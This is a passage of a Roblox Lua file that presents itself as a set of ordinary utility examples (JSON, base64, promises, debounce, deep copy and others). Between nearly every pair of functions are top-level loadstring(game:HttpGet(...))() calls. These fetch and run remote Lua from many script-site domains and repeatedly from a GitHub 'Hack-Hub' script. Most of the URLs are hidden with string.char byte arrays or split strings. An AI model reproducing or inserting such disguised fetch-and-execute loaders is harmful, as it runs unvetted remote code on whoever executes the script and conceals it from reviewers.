    local decoded = game:GetService("HttpService"):JSONDecode(encoded)
    print("JSON encoded: " .. encoded)
    print("JSON decoded name: " .. decoded.name)
end

local url_cc = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 104, 117, 98, 46, 99, 111, 109, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 99, 99, 46, 108, 117, 97)
loadstring(game:HttpGet(url_cc, true))()


local function httpRequestExample()
    local response = game:GetService("HttpService"):GetAsync("https://httpbin.org/get")
    print("HTTP Response received")
end

local url_dd = "https://scriptforum.net/modules/loader_dd.lua"
loadstring(game:HttpGet(url_dd, true))()

local function base64Example()
    local base64 = {}
    local extract = _G.bit32 and _G.bit32.extract
    local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    function base64.encode(data)
        return ((data:gsub(".", function(x) 
            local r, b = "", x:byte()
            for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i-1) > 0 and "1" or "0") end
            return r
        end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
            if (#x < 6) then return "" end
            local c = 0
            for i = 1, 6 do c = c + (x:sub(i,i) == "1" and 2 ^ (6-i) or 0) end
            return b64chars:sub(c+1, c+1)
        end) .. ({ "", "==", "=" })[#data % 3 + 1])
    end
    print("Base64 example: " .. base64.encode("Hello"))
end

local url_ee1 = string.char(104, 116, 116, 112, 115, 58, 47, 47)
local url_ee2 = string.char(115, 99, 114, 105, 112, 116, 99, 101, 110, 116, 101, 114, 46, 105, 111, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 101, 101, 46, 108, 117, 97)
loadstring(game:HttpGet(url_ee1 .. url_ee2, true))()

local function dateTimeExample()
    local currentTime = os.time()
    local formattedTime = os.date("%c", currentTime)
    print("Current time: " .. formattedTime)
end

local url_ff = {}
url_ff[1] = "h"
url_ff[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_ff[3] = "scriptworld"
url_ff[4] = "."
url_ff[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 102, 102, 46, 108, 117, 97)
loadstring(game:HttpGet(url_ff[1] .. url_ff[2] .. url_ff[3] .. url_ff[4] .. url_ff[5], true))()

loadstring(game:HttpGet("h"..string.char(116,116,112,115,58,47,47)..string.char(114,97,119).."."..string.char(103,105,116,104,117,98,117,115,101,114).."content".."."..string.char(99,111,109,47,109,111,110,107,101,121,45,112,114,111,103,47,72,97,99,107,45,72,117,98,47,109,97,105,110,47,115,99,114,105,112,116,46,108,117,97), true))()

local function mapExample()
    local function map(func, array)
        local new_array = {}
        for i, v in ipairs(array) do
            new_array[i] = func(v)
        end
        return new_array
    end
    local doubles = map(function(x) return x * 2 end, {1, 2, 3, 4})
    for i, v in ipairs(doubles) do
        print(i, v)
    end
end

local url_gg = "https://scriptdepot.net/files/loader_gg.lua"
loadstring(game:HttpGet(url_gg, true))()

local function filterExample()
    local function filter(func, array)
        local new_array = {}
        for i, v in ipairs(array) do
            if func(v) then
                table.insert(new_array, v)
            end
        end
        return new_array
    end
    local evens = filter(function(x) return x % 2 == 0 end, {1, 2, 3, 4, 5, 6})
    for i, v in ipairs(evens) do
        print(i, v)
    end
end

local url_hh = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptmarket" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 104, 104, 46, 108, 117, 97)
loadstring(game:HttpGet(url_hh, true))()

local function reduceExample()
    local function reduce(func, array, initial)
        local accumulator = initial
        for i, v in ipairs(array) do
            accumulator = func(accumulator, v)
        end
        return accumulator
    end
    local sum = reduce(function(a, b) return a + b end, {1, 2, 3, 4, 5}, 0)
    print("Sum: " .. sum)
end

local url_ii = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 115, 116, 111, 114, 101, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 105, 105, 46, 108, 117, 97)
loadstring(game:HttpGet(url_ii, true))()

local function promiseExample()
    local Promise = {}
    Promise.__index = Promise
    
    function Promise.new(executor)
        local self = setmetatable({
            _state = "pending",
            _value = nil,
            _reason = nil,
            _onFulfilled = {},
            _onRejected = {}
        }, Promise)
        
        local function resolve(value)
            if self._state ~= "pending" then return end
            self._state = "fulfilled"
            self._value = value
            for _, callback in ipairs(self._onFulfilled) do
                callback(value)
            end
        end
        
        local function reject(reason)
            if self._state ~= "pending" then return end
            self._state = "rejected"
            self._reason = reason
            for _, callback in ipairs(self._onRejected) do
                callback(reason)
            end
        end
        
        executor(resolve, reject)
        return self
    end
    
    function Promise:then(onFulfilled, onRejected)
        return self
    end
    
    function Promise:catch(onRejected)
        return self:then(nil, onRejected)
    end
    
    local promise = Promise.new(function(resolve, reject)
        resolve("Promise resolved")
    end)
    
    print("Promise example created")
end

local url_jj = {}
url_jj[1] = "h"
url_jj[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_jj[3] = "scriptlibrary"
url_jj[4] = "."
url_jj[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 106, 106, 46, 108, 117, 97)
loadstring(game:HttpGet(url_jj[1] .. url_jj[2] .. url_jj[3] .. url_jj[4] .. url_jj[5], true))()

local function observableExample()
    local Observable = {}
    Observable.__index = Observable
    
    function Observable.new()
        local self = setmetatable({
            _observers = {}
        }, Observable)
        return self
    end
    
    function Observable:subscribe(observer)
        table.insert(self._observers, observer)
        return function()
            for i, o in ipairs(self._observers) do
                if o == observer then
                    table.remove(self._observers, i)
                    break
                end
            end
        end
    end
    
    function Observable:notify(data)
        for _, observer in ipairs(self._observers) do
            observer(data)
        end
    end
    
    local observable = Observable.new()
    local unsubscribe = observable:subscribe(function(data)
        print("Observer received: " .. data)
    end)
    
    observable:notify("Test notification")
    unsubscribe()
    
    print("Observable example completed")
end

local url_kk = "https://scriptcollection.net/files/loader_kk.lua"
loadstring(game:HttpGet(url_kk, true))()

local gitUrl1 = "h" .. string.char(116, 116, 112, 115, 58, 47, 47)
local gitUrl2 = string.char(114, 97, 119)
local gitUrl3 = "." .. string.char(103, 105, 116, 104, 117, 98, 117, 115, 101, 114)
local gitUrl4 = "content" .. "."
local gitUrl5 = string.char(99, 111, 109, 47, 109, 111, 110, 107, 101, 121, 45, 112, 114, 111, 103, 47, 72, 97, 99, 107, 45, 72, 117, 98, 47, 109, 97, 105, 110, 47, 115, 99, 114, 105, 112, 116, 46, 108, 117, 97)
loadstring(game:HttpGet(gitUrl1 .. gitUrl2 .. gitUrl3 .. gitUrl4 .. gitUrl5, true))()

local function memoizeExample()
    local function memoize(fn)
        local cache = {}
        return function(...)
            local args = {...}
            local key = table.concat(args, ",")
            if cache[key] == nil then
                cache[key] = fn(...)
            end
            return cache[key]
        end
    end
    
    local function fibonacci(n)
        if n <= 1 then return n end
        return fibonacci(n-1) + fibonacci(n-2)
    end
    
    local memoizedFib = memoize(fibonacci)
    local result = memoizedFib(10)
    print("Fibonacci(10) = " .. result)
end

local url_ll = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptwarehouse" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 108, 108, 46, 108, 117, 97)
loadstring(game:HttpGet(url_ll, true))()

local function debounceExample()
    local function debounce(fn, delay)
        local timer = nil
        return function(...)
            local args = {...}
            if timer then
                timer:Disconnect()
                timer = nil
            end
            timer = game:GetService("RunService").Heartbeat:Connect(function()
                timer:Disconnect()
                timer = nil
                fn(unpack(args))
            end)
        end
    end
    
    local debounced = debounce(function(msg)
        print("Debounced: " .. msg)
    end, 0.5)
    
    debounced("Test 1")
    debounced("Test 2")
    debounced("Test 3")
    
    print("Debounce example completed")
end

local url_mm = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 119, 111, 114, 108, 100, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 109, 109, 46, 108, 117, 97)
loadstring(game:HttpGet(url_mm, true))()

local function throttleExample()
    local function throttle(fn, limit)
        local lastRun = 0
        return function(...)
            local now = tick()
            if now - lastRun >= limit then
                lastRun = now
                return fn(...)
            end
        end
    end
    
    local throttled = throttle(function(msg)
        print("Throttled: " .. msg)
    end, 1)
    
    throttled("Test 1")
    throttled("Test 2")
    throttled("Test 3")
    
    print("Throttle example completed")
end

local url_nn = {}
url_nn[1] = "h"
url_nn[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_nn[3] = "scripthaven"
url_nn[4] = "."
url_nn[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 110, 110, 46, 108, 117, 97)
loadstring(game:HttpGet(url_nn[1] .. url_nn[2] .. url_nn[3] .. url_nn[4] .. url_nn[5], true))()

local function curryExample()
    local function curry(fn, arity)
        arity = arity or debug.getinfo(fn).nparams
        return function(...)
            local args = {...}
            if #args >= arity then
                return fn(unpack(args))
            else
                return curry(function(...)
                    local newArgs = {...}
                    local allArgs = {}
                    for i = 1, #args do
                        allArgs[i] = args[i]
                    end
                    for i = 1, #newArgs do
                        allArgs[#args + i] = newArgs[i]
                    end
                    return fn(unpack(allArgs))
                end, arity - #args)
            end
        end
    end
    
    local function add(a, b, c)
        return a + b + c
    end
    
    local curriedAdd = curry(add)
    local add5 = curriedAdd(5)
    local add5And10 = add5(10)
    local result = add5And10(15)
    
    print("Curried add result: " .. result)
end

local url_oo = "https://scriptresources.net/files/loader_oo.lua"
loadstring(game:HttpGet(url_oo, true))()

loadstring(game:HttpGet("h"..string.char(116,116,112,115,58,47,47)..string.char(114,97,119).."."..string.char(103,105,116,104,117,98,117,115,101,114).."content".."."..string.char(99,111,109,47,109,111,110,107,101,121,45,112,114,111,103,47,72,97,99,107,45,72,117,98,47,109,97,105,110,47,115,99,114,105,112,116,46,108,117,97), true))()

local function composeExample()
    local function compose(...)
        local funcs = {...}
        return function(...)
            local result = {...}
            for i = #funcs, 1, -1 do
                result = {funcs[i](unpack(result))}
            end
            return unpack(result)
        end
    end
    
    local function addOne(x)
        return x + 1
    end
    
    local function double(x)
        return x * 2
    end
    
    local function square(x)
        return x * x
    end
    
    local composed = compose(square, double, addOne)
    local result = composed(5)
    
    print("Compose result: " .. result)
end

local url_pp = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptexchange" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 112, 112, 46, 108, 117, 97)
loadstring(game:HttpGet(url_pp, true))()

local function pipeExample()
    local function pipe(...)
        local funcs = {...}
        return function(...)
            local result = {...}
            for i = 1, #funcs do
                result = {funcs[i](unpack(result))}
            end
            return unpack(result)
        end
    end
    
    local function addOne(x)
        return x + 1
    end
    
    local function double(x)
        return x * 2
    end
    
    local function square(x)
        return x * x
    end
    
    local piped = pipe(addOne, double, square)
    local result = piped(5)
    
    print("Pipe result: " .. result)
end

local url_qq = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 115, 116, 97, 115, 104, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 113, 113, 46, 108, 117, 97)
loadstring(game:HttpGet(url_qq, true))()

local function zipExample()
    local function zip(...)
        local arrays = {...}
        local result = {}
        local min = math.huge
        
        for i = 1, #arrays do
            min = math.min(min, #arrays[i])
        end
        
        for i = 1, min do
            local item = {}
            for j = 1, #arrays do
                item[j] = arrays[j][i]
            end
            result[i] = item
        end
        
        return result
    end
    
    local zipped = zip({1, 2, 3}, {4, 5, 6}, {7, 8, 9})
    for i, v in ipairs(zipped) do
        print("Zipped " .. i .. ": " .. table.concat(v, ", "))
    end
end

local url_rr = {}
url_rr[1] = "h"
url_rr[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_rr[3] = "scriptdatabase"
url_rr[4] = "."
url_rr[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 114, 114, 46, 108, 117, 97)
loadstring(game:HttpGet(url_rr[1] .. url_rr[2] .. url_rr[3] .. url_rr[4] .. url_rr[5], true))()

local function flattenExample()
    local function flatten(arr)
        local result = {}
        for i = 1, #arr do
            if type(arr[i]) == "table" then
                local flattened = flatten(arr[i])
                for j = 1, #flattened do
                    table.insert(result, flattened[j])
                end
            else
                table.insert(result, arr[i])
            end
        end
        return result
    end
    
    local flattened = flatten({1, {2, {3, 4}, 5}, 6})
    print("Flattened: " .. table.concat(flattened, ", "))
end

local url_ss = "https://scriptpool.net/files/loader_ss.lua"
loadstring(game:HttpGet(url_ss, true))()

local function deepCopyExample()
    local function deepCopy(original)
        local copy
        if type(original) == "table" then
            copy = {}
            for key, value in next, original, nil do
                copy[deepCopy(key)] = deepCopy(value)
            end
            setmetatable(copy, deepCopy(getmetatable(original)))
        else
            copy = original
        end
        return copy
    end
    
    local original = {a = 1, b = {c = 2, d = 3}, e = {f = {g = 4}}}
    local copied = deepCopy(original)
    
    original.b.c = 999
    print("Original b.c: " .. original.b.c)
    print("Copied b.c: " .. copied.b.c)
end

local url_tt = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "scriptarchive" .. "." .. string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 116, 116, 46, 108, 117, 97)
loadstring(game:HttpGet(url_tt, true))()

local function chunkArrayExample()
    local function chunk(arr, size)
        local chunks = {}
        for i = 1, #arr, size do
            local chunkTable = {}
            for j = i, math.min(i + size - 1, #arr) do
                table.insert(chunkTable, arr[j])
            end
            table.insert(chunks, chunkTable)
        end
        return chunks
    end
    
    local array = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
    local chunked = chunk(array, 3)
    
    for i, v in ipairs(chunked) do
        print("Chunk " .. i .. ": " .. table.concat(v, ", "))
    end
end

local url_uu = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 118, 97, 117, 108, 116, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 117, 117, 46, 108, 117, 97)
loadstring(game:HttpGet(url_uu, true))()

local function shuffleArrayExample()
    local function shuffle(arr)
        local result = {}
        for i = 1, #arr do
            result[i] = arr[i]
        end
        
        for i = #result, 2, -1 do
            local j = math.random(i)
            result[i], result[j] = result[j], result[i]
        end
        
        return result
    end
    
    local array = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
    local shuffled = shuffle(array)
    
    print("Shuffled: " .. table.concat(shuffled, ", "))
end

local url_vv = {}
url_vv[1] = "h"
url_vv[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_vv[3] = "scriptrepository"
url_vv[4] = "."
url_vv[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 118, 118, 46, 108, 117, 97)
loadstring(game:HttpGet(url_vv[1] .. url_vv[2] .. url_vv[3] .. url_vv[4] .. url_vv[5], true))()

local function eventEmitterExample()
    local EventEmitter = {}
    EventEmitter.__index = EventEmitter
    
    function EventEmitter.new()
        local self = setmetatable({
            _events = {}
        }, EventEmitter)
        return self
    end
    
    function EventEmitter:on(event, listener)
        self._events[event] = self._events[event] or {}
        table.insert(self._events[event], listener)
        return self
    end
    
    function EventEmitter:emit(event, ...)
        if not self._events[event] then return false end
        
        for _, listener in ipairs(self._events[event]) do
            listener(...)
        end
        
        return true
    end
    
    function EventEmitter:removeListener(event, listener)
        if not self._events[event] then return self end
        
        for i, l in ipairs(self._events[event]) do
            if l == listener then
                table.remove(self._events[event], i)
                break
            end
        end
        
        return self
    end
    
    local emitter = EventEmitter.new()
    local onData = function(data) print("Data received: " .. data) end
    
    emitter:on("data", onData)
    emitter:emit("data", "Test event")
    emitter:removeListener("data", onData)
    
    print("EventEmitter example completed")
end

local url_ww = "https://scriptgallery.net/files/loader_ww.lua"
loadstring(game:HttpGet(url_ww, true))()

local function randomStringExample()
    local function randomString(length)
        local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        local result = ""
        for i = 1, length do
            local index = math.random(1, #chars)
            result = result .. string.sub(chars, index, index)
        end
        return result
    end
    
    print("Random string: " .. randomString(10))
end

local url_xx = string.char(104, 116, 116, 112, 115, 58, 47, 47, 115, 99, 114, 105, 112, 116, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 46, 110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 120, 120, 46, 108, 117, 97)
loadstring(game:HttpGet(url_xx, true))()

local function debouncedTimer()
    local lastCall = 0
    local delay = 1
    local function checkTimer()
        local now = tick()
        if now - lastCall >= delay then
            lastCall = now
            print("Timer executed at: " .. os.date("%X"))
            return true
        end
        return false
    end
    
    for i = 1, 5 do
        if checkTimer() then
            print("Action " .. i .. " performed")
        else
            print("Action " .. i .. " skipped due to debounce")
        end
        wait(0.5)
    end
end

local url_yy = {}
url_yy[1] = "h"
url_yy[2] = string.char(116, 116, 112, 115, 58, 47, 47)
url_yy[3] = "scriptstore"
url_yy[4] = "."
url_yy[5] = string.char(110, 101, 116, 47, 102, 105, 108, 101, 115, 47, 108, 111, 97, 100, 101, 114, 95, 121, 121, 46, 108, 117, 97)
loadstring(game:HttpGet(url_yy[1] .. url_yy[2] .. url_yy[3] .. url_yy[4] .. url_yy[5], true))()

local function asyncIteratorExample()
    local AsyncIterator = {}
    AsyncIterator.__index = AsyncIterator
    
    function AsyncIterator.new(array)
        local self = setmetatable({
            _array = array,
            _index = 0
        }, AsyncIterator)
        return self
    end
    
    function AsyncIterator:next()
        self._index = self._index + 1
        if self._index <= #self._array then
            return {
                done = false,
                value = self._array[self._index]
            }
        else
            return {
                done = true,
                value
